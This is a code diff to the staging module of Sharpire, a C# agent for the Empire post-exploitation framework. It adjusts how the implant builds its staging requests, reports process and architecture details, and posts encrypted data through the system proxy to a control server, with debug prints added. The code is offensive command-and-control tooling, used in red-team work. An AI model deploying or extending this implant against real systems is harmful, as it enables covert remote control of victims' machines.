@@ -1,4 +1,8 @@
-﻿using System;
+﻿// Original Author: 0xbadjuju (https://github.com/0xbadjuju/Sharpire)
+// Updated and Modified by: Jake Krasnov (@_Hubbl3)
+// Project: Empire (https://github.com/BC-SECURITY/Empire)
+
+using System;
 using System.Linq;
 using System.Management;
 using System.Management.Automation.Runspaces;
@@ -21,8 +25,9 @@ namespace Sharpire
         ////////////////////////////////////////////////////////////////////////////////
         //
         ////////////////////////////////////////////////////////////////////////////////
-        public EmpireStager(SessionInfo sessionInfo)
+        public EmpireStager(SessionInfo sessionInfo1)
         {
+            sessionInfo = sessionInfo1;
             stagingKeyBytes = Encoding.ASCII.GetBytes(sessionInfo.GetStagingKey());
 
             Random random = new Random();
@@ -156,7 +161,7 @@ namespace Sharpire
             encryptedBytes = Misc.combine(encryptedBytes, hmacBytes.Take(10).ToArray());
 
             ////////////////////////////////////////////////////////////////////////////////
-            return SendStage(0x02, encryptedBytes, sessionInfo.GetControlServers().First() + "/index.jsp");
+            return SendStage(0x02, encryptedBytes, "/index.jsp");
         }
 
         ////////////////////////////////////////////////////////////////////////////////
@@ -252,7 +257,7 @@ namespace Sharpire
             random.NextBytes(initializationVector);
 
             byte[] data = Encoding.ASCII.GetBytes(sessionInfo.GetAgentID());
-            data = Misc.combine(data, new byte[4] { 0x01, meta, 0x00, 0x00 });
+            data = Misc.combine(data, new byte[4] { 0x03, meta, 0x00, 0x00 });
             data = Misc.combine(data, BitConverter.GetBytes(inputData.Length));
 
             byte[] rc4Data = rc4Encrypt(Misc.combine(initializationVector, stagingKeyBytes), data);
@@ -272,6 +277,9 @@ namespace Sharpire
                 webClient.Headers.Add("User-Agent", sessionInfo.GetStagerUserAgent());
                 webClient.Proxy = WebRequest.GetSystemWebProxy();
                 webClient.Proxy.Credentials = CredentialCache.DefaultCredentials;
+                Console.WriteLine("this is the uri string: " + uri);
+                Console.WriteLine("website to reach: "+ sessionInfo.GetControlServers().First() + uri);
+                //old call with the request address being built here 
                 response = webClient.UploadData(sessionInfo.GetControlServers().First() + uri, "POST", data);
             }
             return response;
@@ -339,7 +347,9 @@ namespace Sharpire
             Process process = Process.GetCurrentProcess();
             information += process.ProcessName + "|";
             information += process.Id + "|";
-            information += "powershell|2";
+            //TODO fix this from being hard coded  
+            information += "csharp|5";
+            information += "|" + System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
 
             return Encoding.ASCII.GetBytes(information);
         }
